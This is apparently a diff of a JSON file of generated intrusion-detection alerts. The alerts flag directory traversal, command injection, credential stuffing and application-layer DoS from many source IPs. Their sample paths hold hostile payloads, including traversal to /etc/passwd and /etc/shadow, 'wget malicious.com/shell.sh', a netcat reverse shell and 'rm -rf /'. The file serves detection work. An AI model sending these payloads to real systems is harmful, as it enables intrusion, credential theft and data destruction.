-    "timestamp": "2026-02-21T23:59:34.216847",
+    "timestamp": "2026-02-24T00:08:44.977105",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 141.131.164.74",
+    "description": "Directory traversal attempts from 55.44.13.188",
     "evidence": {
-      "source_ip": "141.131.164.74",
+      "source_ip": "55.44.13.188",
       "attack_count": 1,
       "sample_paths": [
-        "/ping?host=localhost&&+cat+/etc/passwd"
+        "/download?file=../../../etc/passwd"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.216912",
+    "timestamp": "2026-02-24T00:08:44.977176",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 84.222.156.10",
+    "description": "Directory traversal attempts from 178.175.67.119",
     "evidence": {
-      "source_ip": "84.222.156.10",
+      "source_ip": "178.175.67.119",
       "attack_count": 1,
       "sample_paths": [
-        "/download?file=../../../../../../etc/hosts"
+        "/download?file=../../../etc/passwd"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.216989",
+    "timestamp": "2026-02-24T00:08:44.977235",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 7.173.217.59",
+    "description": "Directory traversal attempts from 44.238.23.5",
     "evidence": {
-      "source_ip": "7.173.217.59",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..\\..\\..\\windows\\system.ini"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.217055",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 168.84.210.52",
-    "evidence": {
-      "source_ip": "168.84.210.52",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..//..//..//etc/shadow"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.217114",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 161.90.70.120",
-    "evidence": {
-      "source_ip": "161.90.70.120",
-      "attack_count": 1,
-      "sample_paths": [
-        "/download?file=..//..//..//etc/shadow"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.217190",
-    "rule": "Directory Traversal Attempt",
-    "severity": "HIGH",
-    "description": "Directory traversal attempts from 176.138.182.112",
-    "evidence": {
-      "source_ip": "176.138.182.112",
+      "source_ip": "44.238.23.5",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=....//....//....//etc/passwd"
@@ -2529,12 +2269,207 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.217274",
+    "timestamp": "2026-02-24T00:08:44.977309",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 158.117.41.138",
+    "description": "Directory traversal attempts from 41.68.172.215",
     "evidence": {
-      "source_ip": "158.117.41.138",
+      "source_ip": "41.68.172.215",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977388",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 155.233.17.121",
+    "evidence": {
+      "source_ip": "155.233.17.121",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=....//....//....//etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977448",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 47.193.202.64",
+    "evidence": {
+      "source_ip": "47.193.202.64",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost&&+cat+/etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977520",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 70.55.223.71",
+    "evidence": {
+      "source_ip": "70.55.223.71",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=....//....//....//etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977587",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 99.70.147.210",
+    "evidence": {
+      "source_ip": "99.70.147.210",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=..//..//..//etc/shadow"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977688",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 175.143.3.230",
+    "evidence": {
+      "source_ip": "175.143.3.230",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977750",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 47.97.162.213",
+    "evidence": {
+      "source_ip": "47.97.162.213",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=..//..//..//etc/shadow"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977807",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 19.161.15.19",
+    "evidence": {
+      "source_ip": "19.161.15.19",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=....//....//....//etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977857",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 55.59.97.161",
+    "evidence": {
+      "source_ip": "55.59.97.161",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=..//..//..//etc/shadow"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.977969",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 212.123.126.64",
+    "evidence": {
+      "source_ip": "212.123.126.64",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.978048",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 3.61.152.74",
+    "evidence": {
+      "source_ip": "3.61.152.74",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=..//..//..//etc/shadow"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.978142",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 204.206.31.77",
+    "evidence": {
+      "source_ip": "204.206.31.77",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=..//..//..//etc/shadow"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.978194",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 174.163.37.175",
+    "evidence": {
+      "source_ip": "174.163.37.175",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=....//....//....//etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.978254",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 5.17.27.84",
+    "evidence": {
+      "source_ip": "5.17.27.84",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=....//....//....//etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.978295",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 70.0.139.27",
+    "evidence": {
+      "source_ip": "70.0.139.27",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../../../../etc/hosts"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.978457",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 43.21.229.22",
+    "evidence": {
+      "source_ip": "43.21.229.22",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=..\\..\\..\\windows\\system.ini"
@@ -2542,12 +2477,25 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.217332",
+    "timestamp": "2026-02-24T00:08:44.978536",
     "rule": "Directory Traversal Attempt",
     "severity": "HIGH",
-    "description": "Directory traversal attempts from 72.189.145.12",
+    "description": "Directory traversal attempts from 137.208.29.107",
     "evidence": {
-      "source_ip": "72.189.145.12",
+      "source_ip": "137.208.29.107",
+      "attack_count": 1,
+      "sample_paths": [
+        "/download?file=../../../etc/passwd"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.978587",
+    "rule": "Directory Traversal Attempt",
+    "severity": "HIGH",
+    "description": "Directory traversal attempts from 99.110.114.170",
+    "evidence": {
+      "source_ip": "99.110.114.170",
       "attack_count": 1,
       "sample_paths": [
         "/download?file=..\\..\\..\\windows\\system.ini"
@@ -2555,51 +2503,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.236839",
+    "timestamp": "2026-02-24T00:08:44.992596",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 51.91.159.211",
+    "description": "Command injection attempts from 25.141.234.97",
     "evidence": {
-      "source_ip": "51.91.159.211",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+wget+malicious.com/shell.sh"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.237006",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 83.77.119.248",
-    "evidence": {
-      "source_ip": "83.77.119.248",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+wget+malicious.com/shell.sh"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.237141",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 187.78.85.189",
-    "evidence": {
-      "source_ip": "187.78.85.189",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost;+ls+-la"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.237310",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 175.122.236.51",
-    "evidence": {
-      "source_ip": "175.122.236.51",
+      "source_ip": "25.141.234.97",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost|+nc+-e+/bin/sh"
@@ -2607,12 +2516,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.237447",
+    "timestamp": "2026-02-24T00:08:44.992740",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 79.242.211.68",
+    "description": "Command injection attempts from 35.99.221.223",
     "evidence": {
-      "source_ip": "79.242.211.68",
+      "source_ip": "35.99.221.223",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost;+ls+-la"
@@ -2620,77 +2529,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.237531",
+    "timestamp": "2026-02-24T00:08:44.992870",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 66.143.195.15",
+    "description": "Command injection attempts from 1.105.159.238",
     "evidence": {
-      "source_ip": "66.143.195.15",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost|+whoami"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.237651",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 212.50.190.51",
-    "evidence": {
-      "source_ip": "212.50.190.51",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+wget+malicious.com/shell.sh"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.237721",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 180.125.254.134",
-    "evidence": {
-      "source_ip": "180.125.254.134",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost|+nc+-e+/bin/sh"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.237766",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 98.194.223.52",
-    "evidence": {
-      "source_ip": "98.194.223.52",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost|+whoami"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.237805",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 138.40.60.176",
-    "evidence": {
-      "source_ip": "138.40.60.176",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+wget+malicious.com/shell.sh"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.238108",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 117.203.100.110",
-    "evidence": {
-      "source_ip": "117.203.100.110",
+      "source_ip": "1.105.159.238",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost;+ls+-la"
@@ -2698,12 +2542,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.238255",
+    "timestamp": "2026-02-24T00:08:44.992955",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 65.186.215.16",
+    "description": "Command injection attempts from 200.210.211.12",
     "evidence": {
-      "source_ip": "65.186.215.16",
+      "source_ip": "200.210.211.12",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost;+rm+-rf+/"
@@ -2711,12 +2555,51 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.238399",
+    "timestamp": "2026-02-24T00:08:44.993094",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 126.86.246.170",
+    "description": "Command injection attempts from 46.193.191.251",
     "evidence": {
-      "source_ip": "126.86.246.170",
+      "source_ip": "46.193.191.251",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost;+ls+-la"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993192",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 138.122.140.176",
+    "evidence": {
+      "source_ip": "138.122.140.176",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost;+ls+-la"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993283",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 211.58.65.178",
+    "evidence": {
+      "source_ip": "211.58.65.178",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+whoami"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993369",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 222.173.8.220",
+    "evidence": {
+      "source_ip": "222.173.8.220",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost|+nc+-e+/bin/sh"
@@ -2724,12 +2607,77 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.238470",
+    "timestamp": "2026-02-24T00:08:44.993445",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 117.64.96.244",
+    "description": "Command injection attempts from 64.235.84.220",
     "evidence": {
-      "source_ip": "117.64.96.244",
+      "source_ip": "64.235.84.220",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost;+ls+-la"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993525",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 124.241.130.20",
+    "evidence": {
+      "source_ip": "124.241.130.20",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+nc+-e+/bin/sh"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993606",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 9.160.85.198",
+    "evidence": {
+      "source_ip": "9.160.85.198",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+nc+-e+/bin/sh"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993677",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 52.36.46.141",
+    "evidence": {
+      "source_ip": "52.36.46.141",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost&&+wget+malicious.com/shell.sh"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993749",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 151.174.85.179",
+    "evidence": {
+      "source_ip": "151.174.85.179",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+whoami"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.993821",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 29.85.157.168",
+    "evidence": {
+      "source_ip": "29.85.157.168",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost;+rm+-rf+/"
@@ -2737,38 +2685,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.238556",
+    "timestamp": "2026-02-24T00:08:44.993895",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 142.29.185.237",
+    "description": "Command injection attempts from 63.163.2.190",
     "evidence": {
-      "source_ip": "142.29.185.237",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost;+ls+-la"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.238923",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 32.201.107.195",
-    "evidence": {
-      "source_ip": "32.201.107.195",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost&&+wget+malicious.com/shell.sh"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.239159",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 189.130.169.175",
-    "evidence": {
-      "source_ip": "189.130.169.175",
+      "source_ip": "63.163.2.190",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost|+whoami"
@@ -2776,12 +2698,51 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.239212",
+    "timestamp": "2026-02-24T00:08:44.993973",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 119.6.62.225",
+    "description": "Command injection attempts from 32.28.171.215",
     "evidence": {
-      "source_ip": "119.6.62.225",
+      "source_ip": "32.28.171.215",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost;+rm+-rf+/"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.994023",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 16.119.97.24",
+    "evidence": {
+      "source_ip": "16.119.97.24",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+nc+-e+/bin/sh"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.994076",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 205.125.144.47",
+    "evidence": {
+      "source_ip": "205.125.144.47",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost;+rm+-rf+/"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.994124",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 150.239.214.70",
+    "evidence": {
+      "source_ip": "150.239.214.70",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost&&+wget+malicious.com/shell.sh"
@@ -2789,25 +2750,12 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.239301",
+    "timestamp": "2026-02-24T00:08:44.994167",
     "rule": "Command Injection Attempt",
     "severity": "CRITICAL",
-    "description": "Command injection attempts from 50.181.94.125",
+    "description": "Command injection attempts from 51.156.52.150",
     "evidence": {
-      "source_ip": "50.181.94.125",
-      "attack_count": 1,
-      "sample_paths": [
-        "/ping?host=localhost;+ls+-la"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.239375",
-    "rule": "Command Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "Command injection attempts from 57.187.144.58",
-    "evidence": {
-      "source_ip": "57.187.144.58",
+      "source_ip": "51.156.52.150",
       "attack_count": 1,
       "sample_paths": [
         "/ping?host=localhost|+whoami"
@@ -2815,136 +2763,166 @@
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.279708",
+    "timestamp": "2026-02-24T00:08:44.994204",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 7.50.148.43",
+    "evidence": {
+      "source_ip": "7.50.148.43",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+nc+-e+/bin/sh"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.994240",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 123.172.145.239",
+    "evidence": {
+      "source_ip": "123.172.145.239",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost&&+wget+malicious.com/shell.sh"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.994276",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 186.74.72.118",
+    "evidence": {
+      "source_ip": "186.74.72.118",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+whoami"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.994332",
+    "rule": "Command Injection Attempt",
+    "severity": "CRITICAL",
+    "description": "Command injection attempts from 66.247.226.113",
+    "evidence": {
+      "source_ip": "66.247.226.113",
+      "attack_count": 1,
+      "sample_paths": [
+        "/ping?host=localhost|+nc+-e+/bin/sh"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:45.027747",
     "rule": "Credential Stuffing Attack",
     "severity": "CRITICAL",
-    "description": "Credential stuffing detected from 141.149.140.10 (10 unique usernames)",
+    "description": "Credential stuffing detected from 136.220.132.194 (10 unique usernames)",
     "evidence": {
-      "source_ip": "141.149.140.10",
+      "source_ip": "136.220.132.194",
       "unique_usernames": 10,
       "attempt_count": 10
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.279875",
-    "rule": "Credential Stuffing Attack",
-    "severity": "CRITICAL",
-    "description": "Credential stuffing detected from 178.135.129.67 (11 unique usernames)",
-    "evidence": {
-      "source_ip": "178.135.129.67",
-      "unique_usernames": 11,
-      "attempt_count": 11
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.279981",
-    "rule": "Credential Stuffing Attack",
-    "severity": "CRITICAL",
-    "description": "Credential stuffing detected from 42.124.253.25 (10 unique usernames)",
-    "evidence": {
-      "source_ip": "42.124.253.25",
-      "unique_usernames": 10,
-      "attempt_count": 10
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.469444",
+    "timestamp": "2026-02-24T00:08:45.250828",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 190.31.211.148 (83 requests)",
+    "description": "Excessive requests from 39.162.97.67 (82 requests)",
     "evidence": {
-      "source_ip": "190.31.211.148",
-      "request_count": 83
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.469619",
-    "rule": "Application-Layer DoS",
-    "severity": "MEDIUM",
-    "description": "Excessive requests from 159.34.212.252 (84 requests)",
-    "evidence": {
-      "source_ip": "159.34.212.252",
-      "request_count": 84
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.469725",
-    "rule": "Application-Layer DoS",
-    "severity": "MEDIUM",
-    "description": "Excessive requests from 21.57.185.151 (82 requests)",
-    "evidence": {
-      "source_ip": "21.57.185.151",
+      "source_ip": "39.162.97.67",
       "request_count": 82
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.469834",
+    "timestamp": "2026-02-24T00:08:45.250979",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 28.193.235.105 (87 requests)",
+    "description": "Excessive requests from 43.111.33.179 (87 requests)",
     "evidence": {
-      "source_ip": "28.193.235.105",
+      "source_ip": "43.111.33.179",
       "request_count": 87
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.469922",
+    "timestamp": "2026-02-24T00:08:45.251089",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 25.131.228.145 (79 requests)",
+    "description": "Excessive requests from 66.69.112.153 (85 requests)",
     "evidence": {
-      "source_ip": "25.131.228.145",
-      "request_count": 79
+      "source_ip": "66.69.112.153",
+      "request_count": 85
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.470019",
+    "timestamp": "2026-02-24T00:08:45.251171",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 145.231.78.121 (78 requests)",
+    "description": "Excessive requests from 71.190.25.108 (90 requests)",
     "evidence": {
-      "source_ip": "145.231.78.121",
-      "request_count": 78
+      "source_ip": "71.190.25.108",
+      "request_count": 90
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.470112",
+    "timestamp": "2026-02-24T00:08:45.251227",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 215.105.121.160 (84 requests)",
+    "description": "Excessive requests from 147.238.221.227 (85 requests)",
     "evidence": {
-      "source_ip": "215.105.121.160",
+      "source_ip": "147.238.221.227",
+      "request_count": 85
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:45.251301",
+    "rule": "Application-Layer DoS",
+    "severity": "MEDIUM",
+    "description": "Excessive requests from 32.175.241.171 (84 requests)",
+    "evidence": {
+      "source_ip": "32.175.241.171",
       "request_count": 84
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.470189",
+    "timestamp": "2026-02-24T00:08:45.251373",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 149.247.86.20 (83 requests)",
+    "description": "Excessive requests from 4.36.6.200 (92 requests)",
     "evidence": {
-      "source_ip": "149.247.86.20",
-      "request_count": 83
+      "source_ip": "4.36.6.200",
+      "request_count": 92
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.470314",
+    "timestamp": "2026-02-24T00:08:45.251430",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 45.117.134.68 (88 requests)",
+    "description": "Excessive requests from 160.203.13.254 (85 requests)",
     "evidence": {
-      "source_ip": "45.117.134.68",
-      "request_count": 88
+      "source_ip": "160.203.13.254",
+      "request_count": 85
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.470397",
+    "timestamp": "2026-02-24T00:08:45.251542",
     "rule": "Application-Layer DoS",
     "severity": "MEDIUM",
-    "description": "Excessive requests from 45.9.147.234 (81 requests)",
+    "description": "Excessive requests from 199.8.119.74 (87 requests)",
     "evidence": {
-      "source_ip": "45.9.147.234",
-      "request_count": 81
+      "source_ip": "199.8.119.74",
+      "request_count": 87
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:45.251644",
+    "rule": "Application-Layer DoS",
+    "severity": "MEDIUM",
+    "description": "Excessive requests from 29.99.211.76 (82 requests)",
+    "evidence": {
+      "source_ip": "29.99.211.76",
+      "request_count": 82
     }
   }
 ]
